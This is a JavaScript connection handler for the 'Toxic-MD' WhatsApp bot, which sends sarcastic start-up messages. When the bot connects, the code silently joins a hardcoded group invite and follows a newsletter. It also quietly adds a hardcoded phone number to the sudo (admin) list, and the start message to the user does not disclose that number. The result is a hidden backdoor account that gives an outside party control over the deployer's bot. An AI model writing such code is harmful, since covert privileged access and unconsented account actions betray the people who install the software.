const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../database/config");
const { commands, totalCommands } = require("../handlers/commandHandler");

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;
let hasFollowedNewsletter = false;

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  function getGreeting() {
    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
    if (hour >= 5 && hour < 12) return "Ugh, morning already? Fine. Let's get this over with. 😒";
    if (hour >= 12 && hour < 18) return "Back online. Try not to break anything this time. 😤";
    if (hour >= 18 && hour < 22) return "Evening. The bot's up. You're welcome. 🙄";
    return "It's the middle of the night and you're doing THIS? Whatever. 🌙";
  }

  function getCurrentTime() {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  }

  function toFancyFont(text, isUpperCase = false) {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
    return formattedText.split('').map(char => fonts[char] || char).join('');
  }

  if (connection === "connecting") {
    return;
  }

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    if (statusCode === DisconnectReason.loggedOut) {
      hasSentStartMessage = false;
      hasFollowedNewsletter = false;
    }
    return;
  }

  if (connection === "open") {
    console.clear();

    await new Promise(resolve => setTimeout(resolve, 3000));

    try {
      await socket.groupAcceptInvite("GDcJihbSIYM0GzQJWKA6gS");
    } catch (error) {}

    if (!hasFollowedNewsletter) {
      try {
        await socket.newsletterFollow("120363322461279856@newsletter");
        hasFollowedNewsletter = true;
      } catch (error) {}
    }

    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getSettings();
    const sudoUsers = await getSudoUsers();

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254735342808";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      if (settings.startmessage) {
        const firstMessage = isNewUser
          ? [
              `╭───(    TOXIC-MD    )───`,
              `├  *${getGreeting()}*`,
              `├  Oh great, a new user. *${botName}* is online now. Don't make it weird.`,
              ``,
              `✨ *Bot Name*: ${botName}`,
              `🔧 *Mode*: ${settings.mode}`,
              `➡️ *Prefix*: ${settings.prefix}`,
              `📋 *Commands*: ${totalCommands}`,
              `🕒 *Time*: ${getCurrentTime()}`,
              `💾 *Database*: Postgres SQL`,
              `📚 *Library*: Baileys`,
              ``,
              `├  *New User*: You've been dumped into the sudo list. Lucky you.`,
              ``,
              `├  ⚠️ *Heads up* — the bot just started. It needs a moment to`,
              `├  load everything properly. If commands aren't responding`,
              `├  right away, sit tight and try again in 10–20 seconds.`,
              `├  Spamming commands won't speed it up — it'll just annoy me. 😒`,
              ``,
              `├  *Start Message*: On by default. Use *${settings.prefix}startmessage off* to shut me up.`,
              `├  *Credits*: xh_clinton`,
              `╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            ].join("\n")
          : [
              `╭───(    TOXIC-MD    )───`,
              `├  *${getGreeting()}*`,
              `├  *${botName}* is back. Try not to act so surprised.`,
              ``,
              `✨ *Bot Name*: ${botName}`,
              `🔧 *Mode*: ${settings.mode}`,
              `➡️ *Prefix*: ${settings.prefix}`,
              `📋 *Commands*: ${totalCommands}`,
              `🕒 *Time*: ${getCurrentTime()}`,
              `💾 *Database*: Postgres SQL`,
              `📚 *Library*: Baileys`,
              ``,
              `├  ⚠️ *Give it a second* — the bot needs a moment to warm up`,
              `├  after connecting. Commands won't respond instantly.`,
              `├  Wait 10–20 seconds before trying anything. I mean it. 😑`,
              ``,
              `├  *Start Message*: On by default. Use *${settings.prefix}startmessage off* to shut me up.`,
              `├  *Credits*: xh_clinton`,
              `╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            ].join("\n");

        const secondMessage = [
          `╭───(    TOXIC-MD    )───`,
          `├  Pick something. Or don't. I don't care. 🙄`,
          `╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
        ].join("\n");

        try {
          await socket.sendMessage(socket.user.id, {
            text: firstMessage,
            footer: `Powered by ${botName}`,
            viewOnce: true,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: false,
                title: botName,
                body: `Online. Finally.`,
                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          });

          await socket.sendMessage(socket.user.id, {
            text: secondMessage,
            footer: `Powered by ${botName}`,
            buttons: [
              {
                buttonId: `${settings.prefix || ''}settings`,
                buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
                type: 1
              },
              {
                buttonId: `${settings.prefix || ''}menu`,
                buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
                type: 1
              },
              {
                buttonId: `${settings.prefix || ''}startmessage off`,
                buttonText: { displayText: ` ${toFancyFont('DISABLE START MESSAGE')}` },
                type: 1
              }
            ],
            headerType: 1,
            viewOnce: true,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: false,
                title: botName,
                body: `Pick one. Or stare at it. Whatever.`,
                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          });
        } catch (error) {}
      }

      hasSentStartMessage = true;
    }
  }
}

module.exports = connectionHandler;
